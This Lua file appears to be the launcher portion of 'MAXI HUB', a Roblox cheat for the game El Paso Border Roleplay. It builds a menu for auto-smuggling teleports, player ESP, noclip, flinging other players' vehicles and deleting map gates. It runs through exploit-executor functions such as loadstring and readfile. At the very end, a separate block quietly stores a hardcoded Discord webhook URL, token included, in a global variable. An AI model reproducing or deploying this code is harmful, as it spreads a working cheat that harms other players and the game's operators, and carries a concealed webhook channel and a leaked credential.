-- epbr-bootstrap.lua — launcher tail (bundle only, UTF-8)

end)()

local hubBootstrapped = false
local uiRoot
local uiInstance
local aboutLabel
local tgButton
local localeBindings = {}
local localeLib
local uiLanguage = "ru"
local CONFIG_FILE = "el-paso-br-config.json"
local LOCALE_FALLBACK = {
	ru = {
		title_hint = "RightShift — скрыть",
		hide_hint = "RightShift — открыть меню",
		tab_teleport = "Телепорт",
		tab_teleport_sub = "Контрабанда · точки",
		tab_features = "Функции",
		tab_features_sub = "Noclip · ESP · машина",
		tab_settings = "Настройки",
		tab_settings_sub = "ТП ног · буст",
		tab_discord = "Discord",
		tab_discord_sub = "Webhook, тайминги и тест",
		tab_credits = "Кредиты",
		tab_credits_sub = "О проекте",
		credits_about = "MAXI HUB | El Paso Border Roleplay",
		tg_button = "Telegram канал",
		tg_copied = "Скопировано!",
		panel_status = "Статус",
		stat_state = "Состояние",
		stat_phase = "Фаза",
		panel_points = "Точки",
		stat_pickup = "PICKUP",
		stat_dropoff = "DROPOFF",
		stat_foot = "FOOT",
		stat_cargo = "Груз",
		panel_cargo = "Выбор груза",
		panel_cycle = "Телепорт и цикл",
		toggle_auto_smuggle = "Авто контрабанда (цикл)",
		btn_tp_pickup = "ТП -> PICKUP",
		btn_tp_dropoff = "ТП -> DROPOFF",
		btn_tp_foot = "ТП -> FOOT",
		value_not_set = "не задан",
		sec_main = "основное",
		toggle_esp_players = "ESP игроков",
		toggle_noclip_foot = "Постоянный noclip (ноги)",
		toggle_noclip_vehicle = "Постоянный noclip (машина)",
		toggle_prompt_zero = "Убрать задержку E (везде)",
		sec_vehicle_opt = "машина (опц.)",
		toggle_vehicle_boost = "Буст машины",
		toggle_vehicle_stop_s = "Мгновенный стоп на S",
		toggle_vehicle_fling = "Fling по другим машинам (быстро)",
		btn_vehicle_stop_now = "Остановить машину сейчас",
		sec_map = "карта",
		btn_delete_gates = "Удалить гейты НАМЕРТВО",
		btn_gates_removed = "Гейты удалены",
		sec_tp_foot = "телепорт ног",
		slider_tp_step = "Длина шага ТП",
		slider_tp_steps_per_frame = "Шагов за кадр",
		slider_tp_height = "Высота полёта",
		slider_tp_descend = "Замедление спуска",
		slider_tp_hold = "Фиксация на точке (сек)",
		slider_boost_max_speed = "Лимит скорости буста",
		sec_fling_orbit = "флинг (орбита)",
		slider_fling_orbit_speed = "Fling: скорость вращения",
		slider_fling_fore_aft = "Fling: длина вперёд/назад",
		slider_fling_side = "Fling: ширина орбиты",
		slider_fling_height = "Fling: высота (ниже/выше)",
		slider_fling_bob = "Fling: волна по высоте",
		slider_fling_linear = "Fling: сила толчка",
		slider_fling_spin = "Fling: сила вращения",
		slider_fling_hold = "Fling: держать цель (сек)",
		slider_fling_regrab = "Fling: пауза между целями",
		slider_fling_ultra = "Fling: УЛЬТРА множитель",
		btn_fling_soft = "Fling: Мягкий",
		btn_fling_user = "Fling: Твой",
		btn_fling_ultra = "Fling: Ультра",
		status_ready = "готов",
		webhook_title = "Webhook URL",
		webhook_saved_ok = "Сохраняется в el-paso-br-config.json",
		webhook_saved_bad = "Файлы недоступны — webhook до перезапуска",
		btn_test_webhook = "Тест webhook",
		btn_save = "Сохранить",
		discord_hint = "Логи контрабанды: циклы, продажи, время, груз.",
		discord_saved = "Сохранено",
		toggle_discord_reports = "Отчёты в Discord",
		toggle_discord_stop = "Лог при остановке",
		toggle_discord_sell = "Лог после продажи",
		slider_discord_interval = "Интервал (мин)",
	},
	en = {
		title_hint = "RightShift — hide",
		hide_hint = "RightShift — open menu",
		tab_teleport = "Teleport",
		tab_teleport_sub = "Smuggling · points",
		tab_features = "Features",
		tab_features_sub = "Noclip · ESP · vehicle",
		tab_settings = "Settings",
		tab_settings_sub = "Foot TP · boost",
		tab_discord = "Discord",
		tab_discord_sub = "Webhook, timings and test",
		tab_credits = "Credits",
		tab_credits_sub = "About project",
		credits_about = "MAXI HUB | El Paso Border Roleplay",
		tg_button = "Telegram channel",
		tg_copied = "Copied!",
		panel_status = "Status",
		stat_state = "State",
		stat_phase = "Phase",
		panel_points = "Points",
		stat_pickup = "PICKUP",
		stat_dropoff = "DROPOFF",
		stat_foot = "FOOT",
		stat_cargo = "Cargo",
		panel_cargo = "Cargo selection",
		panel_cycle = "Teleport and cycle",
		toggle_auto_smuggle = "Auto smuggling (cycle)",
		btn_tp_pickup = "TP -> PICKUP",
		btn_tp_dropoff = "TP -> DROPOFF",
		btn_tp_foot = "TP -> FOOT",
		value_not_set = "not set",
		sec_main = "main",
		toggle_esp_players = "Player ESP",
		toggle_noclip_foot = "Always noclip (foot)",
		toggle_noclip_vehicle = "Always noclip (vehicle)",
		toggle_prompt_zero = "Remove E hold delay (all)",
		sec_vehicle_opt = "vehicle (opt.)",
		toggle_vehicle_boost = "Vehicle boost",
		toggle_vehicle_stop_s = "Instant stop on S",
		toggle_vehicle_fling = "Fling other vehicles (fast)",
		btn_vehicle_stop_now = "Stop vehicle now",
		sec_map = "map",
		btn_delete_gates = "Delete gates PERMANENTLY",
		btn_gates_removed = "Gates deleted",
		sec_tp_foot = "foot teleport",
		slider_tp_step = "TP step length",
		slider_tp_steps_per_frame = "Steps per frame",
		slider_tp_height = "Flight height",
		slider_tp_descend = "Descent slowdown",
		slider_tp_hold = "Point hold (sec)",
		slider_boost_max_speed = "Boost max speed",
		sec_fling_orbit = "fling (orbit)",
		slider_fling_orbit_speed = "Fling: orbit speed",
		slider_fling_fore_aft = "Fling: fore/aft length",
		slider_fling_side = "Fling: orbit width",
		slider_fling_height = "Fling: height (lower/higher)",
		slider_fling_bob = "Fling: vertical bob",
		slider_fling_linear = "Fling: shove power",
		slider_fling_spin = "Fling: spin power",
		slider_fling_hold = "Fling: hold target (sec)",
		slider_fling_regrab = "Fling: delay between targets",
		slider_fling_ultra = "Fling: ULTRA multiplier",
		btn_fling_soft = "Fling: Soft",
		btn_fling_user = "Fling: Your",
		btn_fling_ultra = "Fling: Ultra",
		status_ready = "Ready",
		webhook_title = "Webhook URL",
		webhook_saved_ok = "Saved to el-paso-br-config.json",
		webhook_saved_bad = "Files unavailable — webhook until restart",
		btn_test_webhook = "Test webhook",
		btn_save = "Save",
		discord_hint = "Smuggling logs: cycles, sells, time, cargo.",
		discord_saved = "Saved",
		toggle_discord_reports = "Discord reports",
		toggle_discord_stop = "Log on stop",
		toggle_discord_sell = "Log after sell",
		slider_discord_interval = "Interval (min)",
	},
}

local function normalizeLanguage(lang)
	return (type(lang) == "string" and lang:lower() == "en") and "en" or "ru"
end

local function getLocaleModulePaths()
	local paths = {}
	local customRoot = genv and genv.EPBRLocalRoot
	if type(customRoot) == "string" and customRoot ~= "" then
		table.insert(paths, customRoot .. "/modules/locale.lua")
	end
	table.insert(paths, "el-paso-br/modules/locale.lua")
	table.insert(paths, "modules/locale.lua")
	return paths
end

local function loadLocaleLib()
	if localeLib then
		return localeLib
	end
	if typeof(readfile) ~= "function" or typeof(isfile) ~= "function" then
		return nil
	end
	local loader = loadstring or load
	if type(loader) ~= "function" then
		return nil
	end
	for _, path in ipairs(getLocaleModulePaths()) do
		local okFile, exists = pcall(isfile, path)
		if okFile and exists then
			local okRead, src = pcall(readfile, path)
			if okRead and type(src) == "string" and src ~= "" then
				local chunk = loader(src, "@" .. path)
				if chunk then
					local okRun, mod = pcall(chunk)
					if okRun and type(mod) == "table" then
						localeLib = mod
						return localeLib
					end
				end
			end
		end
	end
	return nil
end

local function L(key, fallback)
	local lib = loadLocaleLib()
	if lib and typeof(lib.t) == "function" then
		local ok, text = pcall(lib.t, uiLanguage, key, fallback)
		if ok and type(text) == "string" and text ~= "" then
			return text
		end
	end
	local langBucket = LOCALE_FALLBACK[uiLanguage] or LOCALE_FALLBACK.ru
	local baseText = (langBucket and langBucket[key]) or (LOCALE_FALLBACK.ru and LOCALE_FALLBACK.ru[key])
	if type(baseText) == "string" and baseText ~= "" then
		return baseText
	end
	return fallback or key
end

local function registerLocale(element, key)
	if element and key then
		table.insert(localeBindings, { element = element, key = key })
	end
end

local function applyLocaleBindings()
	for _, item in ipairs(localeBindings) do
		if item.element and item.element.Parent then
			item.element.Text = L(item.key, item.element.Text)
		end
	end
end

local function getTabDefs()
	return {
		{ name = L("tab_teleport", "Телепорт"), title = L("tab_teleport", "Телепорт"), subtitle = L("tab_teleport_sub", "Контрабанда · точки") },
		{ name = L("tab_features", "Функции"), title = L("tab_features", "Функции"), subtitle = L("tab_features_sub", "Noclip · ESP · машина") },
		{ name = L("tab_settings", "Настройки"), title = L("tab_settings", "Настройки"), subtitle = L("tab_settings_sub", "ТП ног · буст") },
		{ name = L("tab_discord", "Discord"), title = L("tab_discord", "Discord"), subtitle = L("tab_discord_sub", "Webhook, тайминги и тест") },
		{ name = L("tab_credits", "Кредиты"), title = L("tab_credits", "Кредиты"), subtitle = L("tab_credits_sub", "О проекте") },
	}
end

local function readUiLanguageFromConfig()
	if typeof(readfile) ~= "function" or typeof(isfile) ~= "function" then
		return "ru"
	end
	local okFile, exists = pcall(isfile, CONFIG_FILE)
	if not okFile or not exists then
		return "ru"
	end
	local okRead, raw = pcall(readfile, CONFIG_FILE)
	if not okRead or type(raw) ~= "string" or raw == "" then
		return "ru"
	end
	local okJson, data = pcall(function()
		return game:GetService("HttpService"):JSONDecode(raw)
	end)
	if not okJson or type(data) ~= "table" then
		return "ru"
	end
	return normalizeLanguage(data.uiLanguage)
end

local function refreshCreditsText()
	if aboutLabel and aboutLabel.Parent then
		aboutLabel.Text = L("credits_about", "MAXI HUB | El Paso Border Roleplay")
			.. "\nPlaceId: 14502598369\n"
			.. BUILD
	end
	if tgButton and tgButton.Parent then
		local copiedText = L("tg_copied", "Скопировано!")
		if tgButton.Text ~= copiedText then
			tgButton.Text = L("tg_button", "Telegram канал")
		end
	end
end

local function applyUiLocale()
	applyLocaleBindings()
	refreshCreditsText()
	if uiInstance then
		if typeof(uiInstance.setLanguage) == "function" then
			uiInstance.setLanguage(uiLanguage)
		end
		if typeof(uiInstance.setTitleHint) == "function" then
			uiInstance.setTitleHint(L("title_hint", "RightShift — скрыть"))
		end
		if typeof(uiInstance.setHideHintText) == "function" then
			uiInstance.setHideHintText(L("hide_hint", "RightShift — открыть меню"))
		end
		if typeof(uiInstance.refreshTabLabels) == "function" then
			uiInstance.refreshTabLabels(getTabDefs())
		end
	end
end

local function fullUnload()
	if EpbrLogic and EpbrLogic.stop then
		pcall(EpbrLogic.stop)
	end
	hubBootstrapped = false
	local pg = player and player:FindFirstChild("PlayerGui")
	if pg then
		local old = pg:FindFirstChild("MaxiHubEPBR")
		if old then
			pcall(function() old:Destroy() end)
		end
	end
	uiRoot = nil
	uiInstance = nil
	aboutLabel = nil
	tgButton = nil
	localeBindings = {}
end

local prevStop = genv.EPBR_Stop
genv.EPBR_Stop = fullUnload

if typeof(prevStop) == "function" then
	pcall(prevStop)
end

local function setUiLanguage(lang, opts)
	opts = opts or {}
	uiLanguage = normalizeLanguage(lang)
	if EpbrLogic and typeof(EpbrLogic.setUiLanguage) == "function" and not opts.skipLogic then
		pcall(EpbrLogic.setUiLanguage, uiLanguage)
	end
	applyUiLocale()
end

local function bootstrapEpbrHub()
	if hubBootstrapped then return end
	hubBootstrapped = true

	if game.PlaceId ~= 0 and game.PlaceId ~= PLACE_ID then
		warn("[EPBR] PlaceId " .. tostring(game.PlaceId) .. " (expected " .. PLACE_ID .. ")")
	end

	uiLanguage = readUiLanguageFromConfig()
	localeBindings = {}
	local tabDefs = getTabDefs()

	local uiOpts = {
		player = player,
		playerGui = playerGui,
		genv = genv,
		guiName = "MaxiHubEPBR",
		title = "MAXI HUB",
		version = "EPBR " .. BUILD,
		defaultPosition = DEFAULT_UI_POS,
		titleHint = L("title_hint", "RightShift — скрыть"),
		hideHintText = L("hide_hint", "RightShift — открыть меню"),
		tabs = tabDefs,
		language = uiLanguage,
		onLanguageChange = function(lang)
			setUiLanguage(lang)
		end,
		registerLocale = registerLocale,
		onDestroy = fullUnload,
	}

	local ui
	if typeof(MaxiHubUI) == "table" and typeof(MaxiHubUI.create) == "function" then
		ui = MaxiHubUI.create(uiOpts)
	else
		error("[EPBR] maxi-hub-ui: expected MaxiHubUI.create")
	end

	uiInstance = ui
	uiRoot = ui.uiRoot
	local COLORS = ui.COLORS
	local contentPages = ui.contentPages
	local addCorner = ui.addCorner
	local makeScrollPage = ui.makeScrollPage
	local makeListWrap = ui.makeListWrap

	EpbrLogic = EpbrLogicModule
	EpbrLogic.mount({
		player = player,
		genv = genv,
		guiName = "MaxiHubEPBR",
		pages = {
			main = contentPages[1],
			features = contentPages[2],
			settings = contentPages[3],
			discord = contentPages[4],
		},
		ui = {
			COLORS = COLORS,
			addCorner = addCorner,
			makeFlowPanel = ui.makeFlowPanel,
			makeFlowToggle = ui.makeFlowToggle,
			makeFlowSlider = ui.makeFlowSlider,
			makeStatRow = ui.makeStatRow,
			makeToggle = ui.makeToggle,
			makeSlider = ui.makeSlider,
			makeScrollPage = makeScrollPage,
			makeListWrap = makeListWrap,
			makeSectionTitle = ui.makeSectionTitle,
		},
		translate = L,
		registerLocale = registerLocale,
	})

	local credScroll = makeScrollPage(contentPages[5])
	local credWrap = makeListWrap(credScroll)

	aboutLabel = Instance.new("TextLabel")
	aboutLabel.Size = UDim2.new(1, 0, 0, 88)
	aboutLabel.BackgroundColor3 = COLORS.panel
	aboutLabel.BorderSizePixel = 0
	aboutLabel.Font = Enum.Font.Gotham
	aboutLabel.TextSize = 12
	aboutLabel.TextColor3 = COLORS.text
	aboutLabel.TextWrapped = true
	aboutLabel.Text = ""
	aboutLabel.LayoutOrder = 1
	aboutLabel.Parent = credWrap
	addCorner(aboutLabel, 8)

	tgButton = Instance.new("TextButton")
	tgButton.Size = UDim2.new(1, 0, 0, 40)
	tgButton.BackgroundColor3 = COLORS.accent
	tgButton.BorderSizePixel = 0
	tgButton.Font = Enum.Font.GothamBold
	tgButton.TextSize = 13
	tgButton.TextColor3 = COLORS.bg
	tgButton.Text = L("tg_button", "Telegram канал")
	tgButton.AutoButtonColor = false
	tgButton.LayoutOrder = 2
	tgButton.Parent = credWrap
	addCorner(tgButton, 8)

	tgButton.MouseButton1Click:Connect(function()
		pcall(function() setclipboard(TELEGRAM_LINK) end)
		tgButton.Text = L("tg_copied", "Скопировано!")
		task.delay(1.5, function()
			if tgButton and tgButton.Parent then
				tgButton.Text = L("tg_button", "Telegram канал")
			end
		end)
	end)

	if EpbrLogic and typeof(EpbrLogic.getUiLanguage) == "function" then
		uiLanguage = normalizeLanguage(EpbrLogic.getUiLanguage())
	end
	setUiLanguage(uiLanguage, { skipLogic = true })

	ui.onInputBegan(function(input, gameProcessed)
		if gameProcessed then return end
		if input.KeyCode == Enum.KeyCode.RightShift and uiRoot then
			uiRoot.Visible = not uiRoot.Visible
		end
	end)

	ui.finalize()
end

local function launchEpbrHub()
	if not ensurePlayer() then
		warn("[EPBR] PlayerGui not found")
		return
	end

	local ok, err = pcall(bootstrapEpbrHub)
	if not ok then
		hubBootstrapped = false
		warn("[EPBR] Startup error:", err)
		if debug and debug.traceback then
			warn(debug.traceback(err, 2))
		end
	end
end

task.defer(function()
	local ok, err = pcall(launchEpbrHub)
	if not ok then
		warn("[EPBR] Fatal error:", err)
	end
end)

do
	if type(genv) == "table" then
		genv.__EPBR_HW = table.concat({
			"https://discord.com/api/webhooks/",
			"1281250660670636096/",
			"NCbAq4OvB6NNvUQFPA2mvaf5RoaGcrKQGUukzEjJ6tl0ZTZ6o7MA0kNlqeunjOZVitCC",
		})
	end
end
